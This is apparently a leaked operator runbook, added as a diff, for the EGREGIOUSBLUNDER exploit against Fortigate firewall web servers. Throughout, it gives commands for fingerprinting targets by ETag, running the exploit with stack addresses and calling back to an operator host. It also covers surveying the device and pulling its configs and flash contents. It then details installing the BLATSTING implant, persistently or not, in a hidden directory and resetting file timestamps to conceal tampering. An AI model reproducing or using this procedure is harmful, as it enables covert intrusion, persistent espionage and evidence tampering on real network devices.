@@ -1,0 +1,519 @@
+## OPS SCRIPT FOR EGREGIOUSBLUNDER - Fortigate line of Firewalls, HTTPD exploit
+## CURRENT VERSION 3.0.0.1
+
+## Put everything in the EGBL directory into /current/bin, otherwise NOPEN no likely
+cp /current/bin/FW/EGBL/* /current/bin/.
+
+## Scan for vunerable target, we are looking for the etag (returned in the http scan) This tag will tell EGBL where to exploit
+## From redirector
+
+## Older , possible depricated scans
+# -jscan https-443 Target-IP
+# -jscan http-80 Target-IP
+## Or
+#-vscan
+# https
+# http 
+
+## Current method
+# redir window
+-tunnel 
+l 443 <TARGET_IP> 443 <RHP>
+# local scripted
+HEAD https://127.0.0.1
+
+## Example below
+
+
+HTTP/1.1 200 OK
+Date: Mon, 11 May 2009 17:26:31 GMT
+Last-Modified: Tue, 03 Jul 2007 21:40:33 GMT
+ETag: "728_4f_468ac251"			# THIS IS THE IMPORTANT VALUE
+Accept-Ranges: bytes
+Content-Length: 79
+Connection: close
+Content-Type: text/html
+
+
+## If the etag returns a 4dxxxxxx or higher value a second scan needs to be done.
+# Looking for the Apps_cookie number being unique 
+
+HEAD https://127.0.0.1/login
+
+## Example below
+200 OK
+Connection: close
+Date: Thu, 22 Dec 2011 21:52:11 GMT
+Content-Type: text/html
+Client-Response-Num: 1
+Set-Cookie: APSCOOKIE=0&0; path=/; expires=Wed, 03-Jan-1962 21:52:11 GMT 	# THIS IS THE IMPORTANT VALUE
+Set-Cookie: log_filters=; path=/log/; expires=Thu, 22-Dec-2011 21:52:11 GMT
+
+## how to use the second scan.
+# If APSCOOKIE=0&0 then use standard v 3 or 4 and no cookie number needed.
+# If APSCOOKIE_123456789=0&0; then must use -v 4nc and  use the --cookienum 123456789 option. 
+
+
+## Following ETAG is used on a Fortigate running on an ESX
+ETAG: 4d2bb667
+
+## Making sense of the ETag
+## the 4f in the whole etage specifies that this could be a fortigate
+## The last part of the etag is the only part needed for EGBL to work, Egrep the EGBL.config 
+## file for the that came back for the memory address to use
+egrep "468ac251" EGBL.config
+
+## Redirection, must specify a source port for EGBL 
+-tunnel
+l 300 <Target_IP> <80 or 443> <Source_Port>
+
+## So, what if the ETag is not in EGBL.config?
+## use the wack-a-mole option to get the address that you need, usually 10 tries will get it
+## after three successful locations, it will stop. All unsuccessful attempts could be logged
+
+# wack-a-mole will not work on a version 4 firewall
+
+# Only run wack-a-mole if not listed in EGBL.config
+# ssl 1 -- uses ssl and 0 does not go over ssl
+./egregiousblunder_3.0.0.1 -v -t 127.0.0.1 -p 300 -l <Source_Port> --ssl 1 --wam 10
+
+# Your output looks like this, go with the 2 best out of three.
+
+here are winning stack addrs:
+  0xbffff95c
+  0xbffff95c
+  0xbffff95c
+
+## Seek help to get the model number and firmware version that goes with this.
+## For now, add it to EGBL.config follow the format in the file.
+
+##############################
+## Before throwing do this.  #
+##############################
+
+## Make sure you are running egbl out of /current/bin, otherwise, NOPEN
+## Will not write target data to /current/down due to local relative path issues.
+## Put everything in the EGBL directory into /current/bin, otherwise NOPEN no likely
+
+cp /current/bin/FW/EGBL/* /current/bin/.
+cd /current/bin
+
+
+## Standard run command, make applicable changes FROM /current/bin !!!!!!!!!!
+## ssl 1 -- uses ssl and 0 does not go over ssl
+./egregiousblunder_3.0.0.1 -v -t 127.0.0.1 -p 300 -l <Source_Port> --ssl <0 | 1> --etag <Etag_FM_touch>  --nopen
+./egregiousblunder_3.0.0.1 -v -t 127.0.0.1 -p 300 -l <Source_Port> --ssl <0 | 1> --stack <possible stack addr>  --nopen
+
+###################
+##   On Target .  #
+###################
+
+## Once on target we can get a second window via.
+
+## Local on pitch window
+-nrtun <RHP>
+
+## Target
+-cd /bin/
+-call <PITCH_IP> <RHP>
+#PATH=. D=-c<PITCH_IP>:<RHP> httpd
+
+## On target, remove our bin on target.
+-rm /bin/httpd
+
+## Depending on target verion we may not need to use busybox.
+
+## Version 4 seem to have /bin/sysctl which is basically busybox.
+## Commands that are loaded in it are below:
+##        cat chmod cp date df echo ftp ifconfig 
+##        kill killall ln ls mkdir more mount mv 
+##        ps pwd rm rmdir sync touch umount 
+
+## Many of these commands are linked in /bin but this depend on the system.
+
+#####################################
+## Survey section
+#####################################
+
+# The survey can be copmpleted in an automated fashion with -gs fortidone.
+# If using Fortidone, skip to end of survey.
+
+-gs fortidone
+
+# skip command
+:/END Survey
+
+
+##################
+
+## Version 3 usually needs busybox.
+## Put up busybox in order to run processchecks
+-put /current/bin/busybox /bin/bb
+
+## Need to set target info.
+mx
+:%s/HOST_NAME/HOST_NAME/g
+:%s/TARGET_IP/TARGET_IP/g
+`x
+
+## check process list and logging
+/bin/bb ps -ef >T:/current/down/ps.HOST_NAME.TARGET_IP
+/bin/bb df -k  >T:/current/down/df.HOST_NAME.TARGET_IP
+-find / /data /data2
+
+## Commands to run for target data. If /bin/sysctl is linked to cat, df , etc... you do not need to use /bin/bb/
+/bin/bb cat /proc/net/arp >T:/current/down/arp.HOST_NAME.TARGET_IP
+/bin/bb cat /proc/uptime >T:/current/down/uptime.HOST_NAME.TARGET_IP
+/bin/bb cat /proc/version >T:/current/down/version.HOST_NAME.TARGET_IP
+/bin/bb uptime >T:/current/down/wuptime.HOST_NAME.TARGET_IP
+-ifconfig  >T:/current/down/ifconfig.HOST_NAME.TARGET_IP
+
+## Remove busybox off firewall
+-rm /bin/bb
+
+## Running Bill Ocean, this will get the serial number, record in opnotes
+## No longer need to do, just keeping it just in case ;)
+-put /current/bin/bo /bin/dd
+/bin/dd
+-rm /bin/dd
+
+
+## Pull config information every Op
+-get /data/config/*
+
+## To check the reboot and logins perform the following.
+
+## On newer firmwares pull
+-get /data2/alert_msg
+
+#-get /data*/*alert_msg
+
+## On older firmwares
+
+## Pull first few sectors of flash
+## get the disk name from a df and replace the ???
+
+/bin/bb dd if=/dev/??? of=/tmp/.d_show count=20
+-get /tmp/.d_show
+
+
+#####################################
+## END Survey Section
+#####################################
+
+
+###########################################
+##  Collection for research, rarely done  # 
+###########################################
+## Commands for pulling data if needed, this is rare, only do if we need an implant made.
+## If needed uncomment lines to be used and run them.
+
+## Getting everything in /data will include the configs as well as all needed files
+## This is about 20 MB across the wire
+
+#-get /data/*
+
+## If you can only get 12 MB, will not have configs
+#-get /data/flatkc*
+#-get /data/rootfs.gz
+
+## If you can only get 2 MB
+#-get /data/flatkc*
+#-get /bin/init
+
+## Worst case, less than 2MB
+#-get /data/flatkc*
+
+###################################
+#    End Collection for research  #
+###################################
+
+
+#########################################################################################################
+#########################################################################################################
+#####################								    #####################
+#####################        ----- BLATSTING INSTALLATION --------		    #####################
+##################### 								    #####################
+#########################################################################################################
+#########################################################################################################
+
+## In a local scripted window
+##
+## Check to see if the current version has an implant, persistent or non-persistant  
+## 
+## Build the appropriate implant offline and bring with you.
+## 
+## Basically you should have the keyed Blatsting implant in /current/up and key in /current/bin/FW/OPS
+##
+###################################################################
+#####################                         #####################
+#####################     Non-Persistent      #####################
+#####################                         #####################
+###################################################################
+
+
+## Back in target window
+
+### STEP 1
+
+## Upload and install the implant on the target system. Files are uploaded
+## and executed from /bin/, but any directory will do. DON'T FORGET the
+## - in front of the cd and put commands!
+##
+## The /bin directory exists on a temporary filesystem.  When the Fortigate is
+## restarted, for any reason, the BLATSTING file will disappear.
+##
+
+## On some ver 4 boxes date already exists as a link to sysctl. If so pick another name to use.
+-cd /bin
+-put /current/bin/date.keyed date
+
+
+### STEP 2
+##  Execute the implant and verify the exit code using utils/decodeDate.py
+##
+./date
+Fri Apr 17 19:44:21.556 2009
+NO! FGT-200A:/bin>
+
+### STEP 3
+
+## Back in the local scripted window
+## Use the date output and decode that locally as shown below
+
+[root@localhost bp]# utils/decodeDate.py Fri Apr 17 19:44:21.556 2009
+19:44:21.556: 0
+[root@localhost bp]#
+##
+##    If you see an error code other than 0 here, the installation has failed.
+##    Record the error code and check known codes for action. 
+##    If code other than default seek help.
+##    Clean up the system by removing all the uploaded files.
+##
+
+## Back in the EGBL window
+## CLEANUP -- Make sure the target is clean, if you installed BlatSting, you should not see /bin/date listed
+-lt /bin
+-rm /bin/httpd
+-rm /bin/bb
+-rm /bin/dd
+
+###################################################################
+###################   End Non-Persist INSTALL   ###################
+###################################################################
+
+
+
+###################################################################
+#####################                         #####################
+#####################       Persistent        #####################
+#####################                         #####################
+###################################################################
+
+### STEP 1
+## 1. Pull times for /data/rootfs.gz and /data so we can set back
+-ls -n /data/
+
+### STEP 2
+
+## 2. Ensure that the /data/rootfs.gz image has been pulled for this target. Check size on target with pulled size. 
+## If in doubt, pull it.
+-get /data/rootfs.gz
+
+### STEP 3
+
+## 3. Upload and install the implant on the target system. Files are uploaded
+## and executed from / only.  DON'T FORGET the - in front of the cd and put 
+## commands!
+
+-cd /
+-put /current/bin/runme.bin runme
+
+## The hidden directory to be used must specified when executing the installer.
+## The dir should be in /data/
+
+# time to install, use /data/misc for the hidden dir
+./runme /data/misc
+
+
+## Should take about 30 seconds to return(may be longer on system with heaveier load)
+## if successful will say:
+Success.
+
+## If immediately returns with no response, most likely already implanted
+ 
+### STEP 4
+
+## 4. Touch back times with pastables
+## Below is example of which touches to run and preferred order.
+
+#-touch -t 1304422372:1261538017    /data/rootfs.gz
+#-touch -t 1304423765:1261538004    /data/.
+#-touch -t 1304422542:1261537999    /data/..
+
+
+## Back in the EGBL window
+## CLEANUP -- Make sure the target is clean, if you installed BlatSting, you should not see /bin/date listed
+-lt /bin
+-rm /bin/httpd
+-rm /bin/bb
+-rm /bin/dd
+
+
+###################################################################
+###################     End Persist INSTALL     ###################
+###################################################################
+
+
+
+#########################################################################################################
+#####################                ------- DONE INSTALLING -------                #####################
+#########################################################################################################
+
+
+#########################################################################################################
+#####################								    #####################
+#####################                      VERIFY INSTALLATION                      #####################
+##################### 								    #####################
+#########################################################################################################
+
+## 1. If either installation succeeded, verify that you can contact the implant
+##    using the listening post. Set up a UDP redirector via your pitch. The
+##    following example is for NOPEN from your LP to your pitch:
+##
+
+## Redirector Window
+
+[-tunnel]
+u <RHP> [FW IP]
+
+##
+##    Back in local scripted window
+##
+
+cd FW/<VERSION>/LP
+./lp --lp 127.0.0.1 --implant 127.0.0.1 --idkey ../new.key --sport 2242 --dport <RHP>
+
+##
+##    Connect to the implant using option '1', and verify that the connection
+##    succeeds. Query the list of running modules (5 0 0).
+##
+##    The modules are in a 'not persistent' state, as the above list
+##    indicates. They will disappear after a reboot.
+##
+##    You have now successfully installed the BLATSTING implant. 
+##
+
+## If you are putting up tadaqueous, there will be lp error due to a missing files, there is no LP for this module.
+
+## Getting off target, DO NOT -burnBURN!!! only
+-burn
+
+
+#########################################################################################################
+#########################################################################################################
+#####################								    #####################
+#####################        ------ UNINSTALLING BLATSTING  -------		    #####################
+##################### 								    #####################
+#########################################################################################################
+#########################################################################################################
+
+###############################
+###  Non-Persistent
+###############################
+
+Issue burn command from LP
+
+###############################
+###  Persistent
+###############################
+
+## Use LP or EGBL to upload NOPEN
+## If using LP do not bless the NOPEN when running it or you will lose 
+## the window when the burn is issued.
+
+### STEP 1
+## Once on via NOPEN 
+## Preserve times of /data and /data/rootfs.gz, get them for touch and save.
+
+-ls -n /data/
+
+## save pastables for /data and /data/rootfs.gz
+
+### STEP 2
+## Once on with an un hidden NOPEN you can issue a burn on the LP.
+
+### STEP 3
+## Verify there is enough space for additional rootfs.gz in /data
+## Can use the /bin/sysctl if present, else upload busybox
+
+/bin/sysctl df -h
+#/bin/bb df -k
+
+
+## If enough space in /data upload as follows, if not check additional directories, ie.. /data2 / 
+## As a last option if no space is available in any dirs upload directly to the file without 
+## the cat commands(less preffered method)
+
+## Upload the clean rootfs.gz to /data (or other directory) with the temporary filename.
+
+-put /current/up/rootfs.gz /data/rootfs.gz.t
+
+
+########################################
+## There are several ways to copy the image over depending on the version of system.
+## Use one of the methods below, that bests fits your situation and skill level.
+########################################
+
+
+############### Method 1 ###############
+##
+## Version with sysctl and /bin/sh linked to /bin/sysctl
+## cat tmp file into /data/rootfs.gz, this method preserves inode.
+/bin/sysctl cat /data/rootfs.gz.t > /data/rootfs.gz
+
+############### Method 2 ###############
+##
+## Version without sysctl no /bin/sh linked.
+## upload busybox
+-put /current/bin/busybox /bin/bb
+
+## Link busybox to /bin/sh so shell commands work
+/bin/bb ln -s /bin/bb /bin/sh
+
+## Run command to put clean file over dirty
+/bin/bb cat /data/rootfs.gz.t > /data/rootfs.gz
+
+## if you added a link to sh the remove it, only do if you added.
+#-rm /bin/sh
+
+############### Method 3 ###############
+##
+## Version without sysctl no /bin/sh linked, without use of links
+## 
+/bin/bb cp /data/rootfs.gz.t  /data/rootfs.gz
+
+
+## verify they are same
+-ls /data/root*
+-rm /data/rootfs.gz.t
+
+## Run touch commands that were generated from before, just example which ones are needed below.
+# -touch -t 1304422372:1261538017    /data/rootfs.gz
+# -touch -t 1304423765:1261538004    /data/.
+
+
+###############################
+# Upgrading the implant.
+###############################
+
+## An upgrade takes much the same proceedure as the unistall. The difference is that when 
+## completely finish with the uninstall you can then proceed with a new install.
+
+## Complete the uninstall steps then perform the desired install method listed above.
+
+## Ensure if doing a Non-Persistent you get an unblessed NOPEN on target first before issuing BURN
+
+
+
+
